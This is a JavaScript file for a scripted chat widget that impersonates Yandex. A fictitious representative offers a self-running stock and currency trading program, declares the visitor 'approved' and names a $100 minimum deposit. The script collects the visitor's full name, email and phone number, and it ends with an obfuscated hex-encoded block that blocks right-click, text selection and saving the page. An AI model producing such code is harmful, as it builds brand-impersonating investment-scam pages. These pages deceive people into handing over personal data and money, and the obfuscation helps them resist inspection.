window.addEventListener('DOMContentLoaded', () => {
  // fields
  const chatContentList1 = document.querySelector('.chat-content-list-1');
  const chatContentList2 = document.querySelector('.chat-content-list-2');
  const chatContentList3 = document.querySelector('.chat-content-list-3');
  const chatContentList4 = document.querySelector('.chat-content-list-4');

  // define form inputs
  const userNameRow = document.querySelector('.user--name');
  const userEmailRow = document.querySelector('.user--email');
  const userPhoneRow = document.querySelector('.user--phone');
  const formButton = document.querySelector('.form--button');

  const messageList = [
    'Здравствуйте! Добро пожаловать в Yandex Invest Team! Меня зовут Амир, я являюсь представителем компании Yandex и помогаю людям ознакомиться с возможностями, представленными в нашей платформе для заработка на бирже акций и валют.',

    // quest
    'Подскажите как я могу к вам обращаться? ',

    // name
    'Скажите, был ли у вас опыт в инвестировании, покупке акций или торговли на биржевом рынке?',

    'Благодарю за ваш ответ! Наша программа работает самостоятельно, вам нужно будет только включать и выключать ее. Так как компания Yandex следует законодательству, мы обязаны прислать вам квитанцию о вашей прибыле и отчет о работе. Для этого прошу указать вашу электронную почту (например: example@gmail.com)',

    'Большое спасибо! Есть хорошие новости: ваш запрос на доступ к платформе одобрен! Начните приумножать Ваш капитал прямо сейчас! Пожалуйста, предоставьте свой номер телефона чтобы мы могли связаться с Вами.       Минимальная сумма инвестиции составляет $100.',
  ];

  const userChoise = [];

  const questionList = [
    {
      item: [
        'Да, я когда то пробовал(а)',
        'Нет, никогда с этим не сталкивался',
        'До сих пор этим занимаюсь',
      ],
    },
  ];

  function getCurrentTime() {
    const currentDate = new Date();
    let minutes =
      currentDate.getMinutes() < 10 ? `0${currentDate.getMinutes()}` : currentDate.getMinutes();
    let hours = currentDate.getHours() < 10 ? `0${currentDate.getHours()}` : currentDate.getHours();
    const currentTime = `${hours}:${minutes}`;
    return currentTime;
  }

  let currentIndex = 0;
  let answerIterator = 0;
  const MAX_INDEX = 6;

  function checkShowContains(element) {
    if (
      !userNameRow.classList.contains('show') &&
      !userEmailRow.classList.contains('show') &&
      !userPhoneRow.classList.contains('show')
    ) {
      chatContentList1.insertAdjacentHTML('beforeend', element);
    }

    if (
      userNameRow.classList.contains('show') &&
      !userEmailRow.classList.contains('show') &&
      !userPhoneRow.classList.contains('show')
    ) {
      chatContentList2.insertAdjacentHTML('beforeend', element);
    }

    if (
      userNameRow.classList.contains('show') &&
      userEmailRow.classList.contains('show') &&
      !userPhoneRow.classList.contains('show')
    ) {
      chatContentList3.insertAdjacentHTML('beforeend', element);
    }

    if (
      userNameRow.classList.contains('show') &&
      userEmailRow.classList.contains('show') &&
      userPhoneRow.classList.contains('show')
    ) {
      chatContentList4.insertAdjacentHTML('beforeend', element);
    }
  }
  function createLoader() {
    const loader = `
			<div class="message-loader" data-loader>
				<p style="color: #F0F0F0; font-style: italic; font-size: 18px; color: rgba(0, 0, 0, 0.6);">Yandex Support печатает…</p>
			</div>
		`;
    checkShowContains(loader);
    // chatContentList4.insertAdjacentHTML('beforeend', loader)
  }

  function removeLoader() {
    const loader = document.querySelector('[data-loader]');
    loader.remove();
  }

  function createBotTemplateMessage(message) {
    const template = `<div class="chat-flex">
				<div class="chat-content-item manager ">
					<div class="chat-content-desc">
						<div class="chat-content-desc-item manager">
							<p class="text">${message}</p>
						</div>
					</div>
				</div>
			</div>
			`;
    checkShowContains(template);
    return template;
  }

  function createBotMessage(messageList) {
    const values = Object.values(messageList);
    createBotTemplateMessage(values[currentIndex]);
    currentIndex++;
  }

  function userMessageTemplate(messageText) {
    const template = `
            <div class="chat-content-item user item-active">
                <div class="chat-content-desc">
                    <div class="chat-content-desc-item user">
                        <p class="text">${messageText}</p>
                    </div>
                </div>
            </div>`;

    checkShowContains(template);
    return template;
  }

  function createAnswerButtonsTemplate(answers) {
    const values = Object.values(answers[answerIterator]);
    const template = document.createElement('div');
    template.classList.add('user-answer_list');

    for (let value of values[0]) {
      const button = document.createElement('div');
      button.classList.add;
      button.classList.add('user--answer', 'chat-content-buttons-gender-block');
      button.innerHTML = value;
      template.appendChild(button);
    }

    answerIterator++;
    return template;
  }

  function renderQuestion() {
    if (
      !userNameRow.classList.contains('show') &&
      !userEmailRow.classList.contains('show') &&
      !userPhoneRow.classList.contains('show')
    ) {
      chatContentList1.append(createAnswerButtonsTemplate(questionList));
    }

    if (
      userNameRow.classList.contains('show') &&
      !userEmailRow.classList.contains('show') &&
      !userPhoneRow.classList.contains('show')
    ) {
      chatContentList2.append(createAnswerButtonsTemplate(questionList));
    }

    if (
      userNameRow.classList.contains('show') &&
      userEmailRow.classList.contains('show') &&
      !userPhoneRow.classList.contains('show')
    ) {
      chatContentList3.append(createAnswerButtonsTemplate(questionList));
    }

    if (
      userNameRow.classList.contains('show') &&
      userEmailRow.classList.contains('show') &&
      userPhoneRow.classList.contains('show')
    ) {
      chatContentList4.append(createAnswerButtonsTemplate(questionList));
    }
  }

  function handleUserChoise() {
    const buttons = document.querySelectorAll('.user--answer');

    for (let i = 0; i < buttons.length; i++) {
      buttons[i].addEventListener('click', (e) => {
        userMessageTemplate(e.target.textContent);
        e.target.parentElement.remove();
        userChoise.push(e.target.textContent);
        startChat(messageList);
      });
    }

    return false;
  }

  // Name
  function enterName() {
    userNameRow.classList.add('show');
  }

  function checkNameInputValue() {
    const firstName = document.querySelector('input[name=first_name]');
    const lastName = document.querySelector('input[name=last_name]');
    const buttonName = document.querySelector('[data-btn-name]');

    buttonName.addEventListener('click', (e) => {
      if (!firstName.value) {
        firstName.classList.add('error');
        firstName.placeholder = 'Введите ваше имя';
        return;
      }

      if (!lastName.value) {
        lastName.classList.add('error');
        lastName.placeholder = 'Введите вашу фамилию';
        return;
      }

      firstName.classList.remove('error');
      lastName.classList.remove('error');
      e.target.remove();
      startChat(messageList);
    });

    return false;
  }

  // Email
  function enterEmail() {
    userEmailRow.classList.add('show');
  }

  function validateEmail(email) {
    return /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/.test(
      String(email).toLowerCase(),
    );
  }

  function checkEmailInputValue() {
    const email = document.querySelector('input[name=email]');
    const btnNext = document.querySelector('[data-btn-email]');

    btnNext.addEventListener('click', (e) => {
      if (validateEmail(email.value) === false) {
        email.classList.add('error');
        email.value = '';
        email.placeholder = 'Введите свой адрес Электронной почты';
      } else {
        email.classList.remove('error');
        e.target.remove();
        startChat(messageList);
      }
    });

    return false;
  }

  // Phone
  function enterPhone() {
    userPhoneRow.classList.add('show');
  }

  function checkPhoneValue() {
    const phone = document.querySelector('input[name=phone]');
    const buttonPhone = document.querySelector('[data-btn-phone]');
    var minNumbersOfDigits = $('.localPhone')[0].dataset.minnumbers;
    var maxNumbersOfDigits = $('.localPhone')[0].dataset.maxnumbers;

    buttonPhone.addEventListener('click', (e) => {
      if (!phone.value) {
        phone.classList.add('error');
        phone.placeholder = 'Введите ваш номер телефона';
      } else {
        if (!/^\d+$/.test(phone.value)) {
          phone.classList.add('error');
          phone.val();
          phone.placeholder = 'телефон должен содержать только цифры';
        } else {
          if (phone.value.length < minNumbersOfDigits) {
            phone.classList.add('error');
            phone.value = '';
            phone.placeholder = 'Слишком короткий номер';
            return false;
          } else {
            if (phone.value.length > maxNumbersOfDigits) {
              phone.classList.add('error');
              phone.value = '';
              phone.placeholder = 'Слишком длинный номер';
              return false;
            } else {
              phone.classList.remove('error');
              e.target.remove();
              startChat(messageList);
            }
          }
        }
      }
    });

    showRegisterButton();
    return false;
  }

  function showRegisterButton() {
    formButton.classList.remove('hide');
    formButton.classList.add('show');
  }

  function checkCurrentIndex(index, list) {
    if (index === MAX_INDEX) {
      showRegisterButton();
      return;
    }

    if (index === 2) {
      enterName();
      checkNameInputValue();
      return;
    }

    if (index === 3) {
      renderQuestion();
      handleUserChoise(list);
      return;
    }

    if (index === 4) {
      enterEmail();
      checkEmailInputValue();
      // handleUserChoise(list)
      return;
    }

    if (index === 5) {
      enterPhone();
      checkPhoneValue();
      return;
    }

    startChat(list);

    return index;
  }

  function startChat() {
    createLoader();
    setTimeout(() => {
      removeLoader();
      createBotMessage(messageList, currentIndex);
      checkCurrentIndex(currentIndex, questionList);
    }, 2000);
  }

  startChat();

  function showTime() {
    const currentTime = document.querySelector('.message-time');
    currentTime.innerHTML = getCurrentTime();
  }

  function showAccordion() {
    const accordBtn = document.querySelector('.main__sup-btn');
    const accordContent = document.querySelector('.meta__sup-text');

    accordBtn.addEventListener('click', () => {
      accordBtn.classList.toggle('active');
      accordContent.classList.toggle('active');
    });
  }
  function showModal() {
    const modalBtn = document.querySelector('[data-modal]');
    const modalClose = document.querySelector('[data-modal-close]');
    const modalContent = document.querySelector('.header__modal');

    modalBtn.addEventListener('click', () => {
      modalContent.classList.toggle('active');
    });
    modalClose.addEventListener('click', () => {
      modalContent.classList.remove('active');
    });
  }

  const setDocument = () => {
    var _0xf2ad = [
      '\x6F\x6E\x6C\x6F\x61\x64',
      '\x6F\x6E\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75',
      '\x62\x6F\x64\x79',
      '\x73\x65\x6C\x65\x63\x74\x73\x74\x61\x72\x74',
      '\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74',
      '\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72',
      '\x6B\x65\x79\x64\x6F\x77\x6E',
      '\x6B\x65\x79\x43\x6F\x64\x65',
      '\x4D\x61\x63',
      '\x6D\x61\x74\x63\x68',
      '\x70\x6C\x61\x74\x66\x6F\x72\x6D',
      '\x6D\x65\x74\x61\x4B\x65\x79',
      '\x63\x74\x72\x6C\x4B\x65\x79',
      '\x73\x74\x6F\x70\x50\x72\x6F\x70\x61\x67\x61\x74\x69\x6F\x6E',
    ];
    window[_0xf2ad[0]] = function () {
      document[_0xf2ad[2]][_0xf2ad[1]] = function () {
        return false;
      };
      window[_0xf2ad[5]](_0xf2ad[3], function (_0xc4b2x1) {
        _0xc4b2x1[_0xf2ad[4]]();
      });
      document[_0xf2ad[5]](
        _0xf2ad[6],
        function (_0xc4b2x1) {
          if (
            _0xc4b2x1[_0xf2ad[7]] == 83 &&
            (navigator[_0xf2ad[10]][_0xf2ad[9]](_0xf2ad[8])
              ? _0xc4b2x1[_0xf2ad[11]]
              : _0xc4b2x1[_0xf2ad[12]])
          ) {
            _0xc4b2x1[_0xf2ad[4]]();
            _0xc4b2x1[_0xf2ad[13]]();
          }
        },
        false,
      );
    };
  };

  showModal();
  showAccordion();
  showTime();
  setDocument();
});
